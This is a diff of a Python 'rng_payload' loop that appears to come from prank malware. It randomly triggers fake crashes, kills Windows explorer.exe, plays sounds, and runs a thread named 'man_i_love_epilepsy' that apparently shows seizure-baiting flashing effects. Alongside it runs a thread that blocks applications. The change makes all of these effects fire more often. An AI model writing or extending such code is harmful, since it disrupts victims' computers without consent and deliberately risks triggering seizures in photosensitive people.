@@ -112,20 +112,20 @@ def rng_payload():
 	epilepsy_thread = threading.Thread(target=man_i_love_epilepsy)
 
 	while True:
-		num = random.randint(0, 99)
+		num = random.randint(0, 10)
 		print(num)
 		match num:
 			case 0:
 				crash_thread.run() # show crash effects and restart
 			case 1:
 				os.system('taskkill /f /im explorer.exe') # self-explanitory 
-			case 50:
+			case 2:
 				ear_thread.run() # plays hueuh.mp3
-			case 60 | 61 | 62 | 63 | 64 | 65 | 66 | 67 | 68 | 69:
+			case 3:
 				epilepsy_thread.run() # man i love epilepsy
-			case 99 | 95 | 96 | 97 | 98:
+			case 5:
 				cherry_thread.run() # plays cherry.mp3
-		time.sleep(1)
+		time.sleep(15)
 
 
 block_apps_thread = threading.Thread(target=blocked_apps)
